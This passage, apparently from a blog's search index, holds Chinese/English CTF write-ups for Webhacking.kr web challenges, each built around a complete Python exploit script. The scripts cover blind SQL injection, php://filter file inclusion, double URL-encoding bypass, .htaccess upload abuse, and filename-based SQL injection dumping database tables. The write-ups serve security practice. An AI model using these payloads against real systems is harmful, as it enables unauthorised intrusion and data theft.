class="keyword">in</span> hex_chars:</span><br><span class="line">            code = <span class="built_in">ord</span>(char)</span><br><span class="line">            condition = <span class="string">f&quot;ascii(substr(pw,<span class="subst">&#123;position&#125;</span>,1))=<span class="subst">&#123;code&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> oracle(session, condition):</span><br><span class="line">                result.append(char)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;hash character at position <span class="subst">&#123;position&#125;</span> was not found&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_candidate</span>(<span class="params">digest, candidates</span>):</span><br><span class="line">    <span class="keyword">for</span> candidate <span class="keyword">in</span> candidates:</span><br><span class="line">        calculated = hashlib.md5((candidate + <span class="string">&quot;apple&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> calculated == digest:</span><br><span class="line">            <span class="keyword">return</span> candidate</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no candidate matched the recovered digest&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">session, password</span>):</span><br><span class="line">    response = session.post(</span><br><span class="line">        URL,</span><br><span class="line">        data=&#123;<span class="string">&quot;uuid&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;pw&quot;</span>: password&#125;,</span><br><span class="line">        timeout=<span class="number">10</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--candidate&quot;</span>, action=<span class="string">&quot;append&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        digest = recover_hash(session)</span><br><span class="line">        password = find_candidate(digest, args.candidate)</span><br><span class="line">        result = login(session, password)</span><br><span class="line">        <span class="built_in">print</span>(digest)</span><br><span class="line">        <span class="built_in">print</span>(result.status_code)</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p><code>#</code> 注释掉原查询剩余部分，<code>substr</code> 的位置从 1
+开始；脚本只把字符集限定为 MD5
+的十六进制字符。候选集必须覆盖真实明文，SQLi 本身只能取出 hash。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>md5</tag>
+        <tag>blind-sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-25</title>
+    <url>/wp/webhacking/old-25/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Read the flag source through the file parameter.</p>
+<p>通过 file 参数读取 flag 源码。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://webhacking.kr:10001/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p><code>file</code> 参数进入 PHP 的文件包含路径，服务端会在资源名后补上
+<code>.php</code>。直接包含 <code>flag</code> 会执行其中的
+PHP；把路径改成
+<code>php://filter/convert.base64-encode/resource=flag</code> 后，PHP
+先读取 <code>flag.php</code>，再将源码编码为
+Base64，源码内容不会被执行。</p>
+<h3 id="solution">Solution</h3>
+<p>完整请求脚本如下。它从响应中提取 Base64
+字符串并尝试解码，直到找到包含 PHP flag 变量的源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://webhacking.kr:10017/&quot;</span></span><br><span class="line">FILTER_PATH = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_source</span>(<span class="params">response_text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    candidates = re.findall(<span class="string">r&quot;[A-Za-z0-9+/]&#123;20,&#125;=&#123;0,2&#125;&quot;</span>, response_text)</span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> candidates:</span><br><span class="line">        padded = token + <span class="string">&quot;=&quot;</span> * (-<span class="built_in">len</span>(token) % <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = base64.b64decode(padded, validate=<span class="literal">True</span>).decode(</span><br><span class="line">                <span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> (ValueError, UnicodeError):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$flag&quot;</span> <span class="keyword">in</span> decoded <span class="keyword">or</span> <span class="string">&quot;FLAG&#123;&quot;</span> <span class="keyword">in</span> decoded:</span><br><span class="line">            <span class="keyword">return</span> decoded</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;response did not contain decodable flag source&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    response = requests.get(</span><br><span class="line">        URL,</span><br><span class="line">        params=&#123;<span class="string">&quot;file&quot;</span>: FILTER_PATH&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(decode_source(response.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>从响应中读取并解码 <code>flag.php</code> 源码后，将其中的 flag
+填入认证表单。</p>
+<p>服务端响应模板变化时，应先从响应中定位实际 Base64 内容。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>php</tag>
+        <tag>lfi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-26</title>
+    <url>/wp/webhacking/old-26/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Bypass the filter that rejects the literal <code>admin</code>
+value.</p>
+<p>绕过拒绝字面量 <code>admin</code> 的过滤器。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-11/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>服务端先在原始参数中检查 <code>admin</code>，之后才调用
+<code>urldecode()</code>。因此需要两层 URL encoding：HTTP
+层第一次解码后，PHP 的过滤器仍只能看到
+<code>%61%64%6d%69%6e</code>；代码再次调用 <code>urldecode()</code>
+后，值才变成 <code>admin</code> 并通过后续判断。</p>
+<h3 id="solution">Solution</h3>
+<p>完整 Python 请求如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://webhacking.kr/challenge/web-11/&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;%2561%2564%256d%2569%256e&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># 直接拼接已双重编码的值，保留两层百分号编码。</span></span><br><span class="line">    response = requests.get(</span><br><span class="line">        BASE_URL + <span class="string">&quot;?id=&quot;</span> + PAYLOAD,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>解码过程是：<code>%2561%2564%256d%2569%256e</code> →
+<code>%61%64%6d%69%6e</code> → <code>admin</code>。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>php</tag>
+        <tag>url-encoding</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-28</title>
+    <url>/wp/webhacking/old-28/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Read <code>flag.php</code> through an Apache upload directory.</p>
+<p>通过 Apache 上传目录读取 <code>flag.php</code>。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://webhacking.kr:10002/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>上传处理器接受名为 <code>.htaccess</code> 的文件，并把文件放进可被
+Apache 访问的随机目录。目录中的 <code>.htaccess</code> 会覆盖该目录的
+PHP handler；<code>php_flag engine off</code> 关闭 PHP
+执行后，访问同目录的 <code>flag.php</code> 会返回源码而非执行结果。</p>
+<h3 id="solution">Solution</h3>
+<p>完整上传和读取脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://webhacking.kr:10002/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_directory</span>(<span class="params">response_text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;/upload/[A-Za-z0-9]+/&quot;</span>, response_text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;upload response did not contain the upload directory&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    response = session.post(</span><br><span class="line">        BASE_URL,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upfile&quot;</span>: (</span><br><span class="line">                <span class="string">&quot;.htaccess&quot;</span>,</span><br><span class="line">                <span class="string">b&quot;php_flag engine off\n&quot;</span>,</span><br><span class="line">                <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">        &#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line"></span><br><span class="line">    upload_dir = upload_directory(response.text)</span><br><span class="line">    flag_source = session.get(</span><br><span class="line">        <span class="string">&quot;http://webhacking.kr:10002&quot;</span> + upload_dir + <span class="string">&quot;flag.php&quot;</span>,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    flag_source.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(flag_source.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>读取源码后，将其中的 flag 填入认证表单。</p>
+<p>上传目录名按 session
+随机生成，脚本从上传响应提取目录；<code>.htaccess</code>
+还要求该目录允许 Apache override。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>apache</tag>
+        <tag>upload</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-29</title>
+    <url>/wp/webhacking/old-29/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Extract the flag from another table through the uploaded
+filename.</p>
+<p>利用上传文件名从另一张表提取 flag。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-14/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>上传请求的 multipart <code>filename</code> 被直接写入
+SQL。页面显示字段顺序是 <code>time | ip | file</code>，但 INSERT
+的值顺序是 <code>file, time, ip</code>。文件名中的单引号可以结束第一个
+<code>file</code> 值，然后追加第二行
+INSERT，把子查询结果写进列表可见的文件名列；末尾的 <code>#</code>
+注释掉原查询余下部分。列表只显示当前客户端 IP 的记录，因此三处 IP
+值必须与当前页面显示的地址一致。</p>
+<h3 id="solution">Solution</h3>
+<p>下面的完整脚本用同一个 multipart 请求发送每个 filename
+payload。<code>CLIENT_IP</code>
+必须替换为题目页面显示的当前客户端地址；它是请求环境值，不是 flag。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://webhacking.kr:10004/&quot;</span></span><br><span class="line">CLIENT_IP = <span class="string">&quot;&lt;client-ip&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filename_for</span>(<span class="params">expression: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">&quot;abc&#x27;,123,&#x27;&#123;ip&#125;&#x27;),&quot;</span></span><br><span class="line">        <span class="string">&quot;((SELECT &#123;expression&#125;),123,&#x27;&#123;ip&#125;&#x27;)#&quot;</span></span><br><span class="line">    ).<span class="built_in">format</span>(ip=CLIENT_IP, expression=expression)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_and_print</span>(<span class="params">session: requests.Session, expression: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    filename = filename_for(expression)</span><br><span class="line">    response = session.post(</span><br><span class="line">        BASE_URL,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upfile&quot;</span>: (filename, <span class="string">b&quot;&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    upload_and_print(session, <span class="string">&quot;DATABASE()&quot;</span>)</span><br><span class="line">    upload_and_print(</span><br><span class="line">        session,</span><br><span class="line">        <span class="string">&quot;GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES &quot;</span></span><br><span class="line">        <span class="string">&quot;WHERE TABLE_SCHEMA=&#x27;chall29&#x27;&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    upload_and_print(</span><br><span class="line">        session,</span><br><span class="line">        <span class="string">&quot;GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS &quot;</span></span><br><span class="line">        <span class="string">&quot;WHERE TABLE_NAME=&#x27;flag_congratz&#x27;&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    upload_and_print(session, <span class="string">&quot;flag FROM flag_congratz&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>查询顺序是数据库名、表名、列名、flag。读取 flag 后填入认证表单。</p>
+<p><code>CLIENT_IP</code>
+和题目端口的记录筛选都与当前请求环境绑定；先读取页面显示的地址再运行，否则插入的记录可能不会回显。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+        <tag>file-upload</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-33</title>
+    <url>/wp/webhacking/old-33/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Complete a chain of small server-side validation steps.</p>
+<p>完成一组逐步变化的服务端校验。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-6/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>每个阶段只在前一阶段条件成立时继续返回 next link。校验链如下：</p>
+<ol type="1">
+<li>GET 参数 <code>get=hehe</code>。</li>
+<li>POST 参数 <code>post=hehe</code>、<code>post2=hehe2</code>。</li>
+<li><code>myip</code> 等于服务端看到的客户端公网 IP。</li>
+<li><code>password</code> 等于当前 Unix 秒数的
+MD5，需要在当前秒提交。</li>
+<li>GET、POST 和 Cookie 三类输入同时非空。</li>
+<li>Cookie <code>test=md5(REMOTE_ADDR)</code>，POST
+<code>kk=md5(HTTP_USER_AGENT)</code>。</li>
+<li>GET 参数名和值都使用去掉点号后的客户端公网 IP。</li>
+<li><code>addr=127.0.0.1</code>。</li>
+<li><code>ans=acegikmoqsuwy</code>。</li>
+<li>33-10 根据页面 source 中的字符替换、截断和除法逻辑生成
+<code>answerip/27287674755_5457534951.php</code>。</li>
+</ol>
+<p>前六步及后续阶段依赖同一 session；IP、User-Agent
+和当前秒数变化后，派生值也随之变化。</p>
+<h3 id="solution">Solution</h3>
+<p>下面的完整脚本保留同一
+<code>requests.Session</code>，按顺序发送前十步请求。<code>CLIENT_IP</code>
+使用题目页面显示的当前客户端地址，<code>session-cookie</code>
+从环境变量读取。每一步都检查响应中是否仍出现
+<code>Next</code>；最终请求使用 answerip 路径。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://webhacking.kr/challenge/bonus-6/&quot;</span></span><br><span class="line">ANSWER_PATH = <span class="string">&quot;answerip/27287674755_5457534951.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">require_next</span>(<span class="params">response: requests.Response, stage: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Stop when a stage does not expose the next-stage response.&quot;&quot;&quot;</span></span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Next&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;stage <span class="subst">&#123;stage&#125;</span> did not return Next&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;stage <span class="subst">&#123;stage&#125;</span>: <span class="subst">&#123;response.status_code&#125;</span> <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_text</span>(<span class="params">value: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(value.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    client_ip = os.environ.get(<span class="string">&quot;CLIENT_IP&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> client_ip:</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="string">&quot;set CLIENT_IP to the address shown by the challenge&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    user_agent = session.headers[<span class="string">&quot;User-Agent&quot;</span>]</span><br><span class="line"></span><br><span class="line">    require_next(session.get(BASE_URL, params=&#123;<span class="string">&quot;get&quot;</span>: <span class="string">&quot;hehe&quot;</span>&#125;, timeout=<span class="number">20</span>), <span class="string">&quot;33-1&quot;</span>)</span><br><span class="line">    require_next(</span><br><span class="line">        session.post(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;post&quot;</span>: <span class="string">&quot;hehe&quot;</span>, <span class="string">&quot;post2&quot;</span>: <span class="string">&quot;hehe2&quot;</span>&#125;,</span><br><span class="line">            timeout=<span class="number">20</span>,</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;33-2&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    require_next(session.get(BASE_URL, params=&#123;<span class="string">&quot;myip&quot;</span>: client_ip&#125;, timeout=<span class="number">20</span>), <span class="string">&quot;33-3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    current_second = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    require_next(</span><br><span class="line">        session.get(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            params=&#123;<span class="string">&quot;password&quot;</span>: md5_text(current_second)&#125;,</span><br><span class="line">            timeout=<span class="number">20</span>,</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;33-4&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&quot;imcookie&quot;</span>, <span class="string">&quot;1&quot;</span>, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    require_next(session.get(BASE_URL, params=&#123;<span class="string">&quot;imget&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;, timeout=<span class="number">20</span>), <span class="string">&quot;33-5-get&quot;</span>)</span><br><span class="line">    require_next(session.post(BASE_URL, data=&#123;<span class="string">&quot;impost&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;, timeout=<span class="number">20</span>), <span class="string">&quot;33-5-post&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&quot;test&quot;</span>, md5_text(client_ip), domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    require_next(</span><br><span class="line">        session.post(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;kk&quot;</span>: md5_text(user_agent)&#125;,</span><br><span class="line">            timeout=<span class="number">20</span>,</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;33-6&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    ip_without_dots = client_ip.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    require_next(</span><br><span class="line">        session.get(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            params=&#123;ip_without_dots: ip_without_dots&#125;,</span><br><span class="line">            timeout=<span class="number">20</span>,</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;33-7&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    require_next(session.get(BASE_URL, params=&#123;<span class="string">&quot;addr&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;, timeout=<span class="number">20</span>), <span class="string">&quot;33-8&quot;</span>)</span><br><span class="line">    require_next(</span><br><span class="line">        session.get(BASE_URL, params=&#123;<span class="string">&quot;ans&quot;</span>: <span class="string">&quot;acegikmoqsuwy&quot;</span>&#125;, timeout=<span class="number">20</span>),</span><br><span class="line">        <span class="string">&quot;33-9&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    answer_url = BASE_URL + ANSWER_PATH</span><br><span class="line">    response = session.get(answer_url, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>对应的关键请求形态为：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET  /challenge/bonus-6/?get=hehe</span><br><span class="line">POST /challenge/bonus-6/  post=hehe&amp;post2=hehe2</span><br><span class="line">GET  /challenge/bonus-6/?myip=&lt;client-ip&gt;</span><br><span class="line">GET  /challenge/bonus-6/?password=md5(&lt;current-unix-second&gt;)</span><br><span class="line">GET  /challenge/bonus-6/?imget=1</span><br><span class="line">POST /challenge/bonus-6/  impost=1</span><br><span class="line">Cookie: imcookie=1</span><br><span class="line">POST /challenge/bonus-6/  kk=md5(&lt;current-user-agent&gt;)</span><br><span class="line">Cookie: test=md5(&lt;client-ip&gt;)</span><br><span class="line">GET  /challenge/bonus-6/?&lt;ip-without-dots&gt;=&lt;ip-without-dots&gt;</span><br><span class="line">GET  /challenge/bonus-6/?addr=127.0.0.1</span><br><span class="line">GET  /challenge/bonus-6/?ans=acegikmoqsuwy</span><br><span class="line">GET  /challenge/bonus-6/answerip/27287674755_5457534951.php</span><br></pre></td></tr></table></figure>
+<p>同一 session 需要按顺序完成 33-1 到
+33-10，最终请求进入题目完成分支。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>scripting</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-36</title>
+    <url>/wp/webhacking/old-36/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Recover source and flag data from a Vim swap file.</p>
+<p>从 Vim swap 文件中恢复源码和 flag。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-8/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目目录残留 <code>.index.php.swp</code>。Vim swap
+文件虽然包含二进制元数据，但编辑中的 PHP
+文本仍以可搜索字符串保存在响应中。下载响应后，按 <code>FLAG{</code>
+开头、<code>}</code> 结尾的字节模式提取 flag 即可恢复题目数据。</p>
+<h3 id="solution">Solution</h3>
+<p>目标文件为：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/challenge/bonus-8/.index.php.swp</span><br></pre></td></tr></table></figure>
+<p>下面的完整脚本下载 swap 文件，并从字节内容中提取 flag：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://webhacking.kr/challenge/bonus-8/.index.php.swp&quot;</span></span><br><span class="line">FLAG_PATTERN = re.<span class="built_in">compile</span>(<span class="string">rb&quot;FLAG\&#123;[^&#125;\r\n]+\&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    response = requests.get(URL, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    matches = FLAG_PATTERN.findall(response.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> matches:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no flag-shaped text found in the Vim swap response&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> matches:</span><br><span class="line">        <span class="built_in">print</span>(value.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>响应包含 Vim swap 内容；从中读取并恢复 flag 后填入认证表单。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>linux</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>vim</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-38</title>
+    <url>/wp/webhacking/old-38/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Inject an admin log entry through the login form.</p>
+<p>通过登录表单注入 admin 日志记录。</p>
